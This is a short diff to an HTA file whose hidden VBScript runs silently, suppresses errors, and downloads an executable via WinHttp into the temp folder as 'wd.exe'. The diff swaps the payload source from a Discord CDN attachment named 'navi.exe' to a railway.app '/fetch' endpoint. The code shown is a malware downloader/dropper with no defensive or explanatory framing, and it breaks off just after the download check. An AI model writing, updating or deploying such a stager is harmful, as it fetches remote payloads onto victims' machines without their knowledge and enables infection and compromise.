@@ -3,14 +3,14 @@
 <hta:application showintaskbar="no" caption="no" border="none" />
 <script language="VBScript">
 On Error Resume Next
-Dim s,f,t,p,x,h,g
+Dim s,f,t,p,x,h
 Set s=CreateObject("WScript.Shell")
 Set f=CreateObject("Scripting.FileSystemObject")
 t=f.GetSpecialFolder(2)
 p=t&"\wd.exe"
 
 Set x=CreateObject("WinHttp.WinHttpRequest.5.1")
-x.Open "GET","https://cdn.discordapp.com/attachments/1530596353376387113/1530742385942859896/navi.exe?ex=6a66ae70&is=6a655cf0&hm=c3eb2729fc4b208f419cbb1469c95c7c51398a7c2e3e38a5fab4c1a66e2b37f9&",False
+x.Open "GET","https://rig-gamble.up.railway.app/fetch",False
 x.Send
 
 If x.Status=200 Then
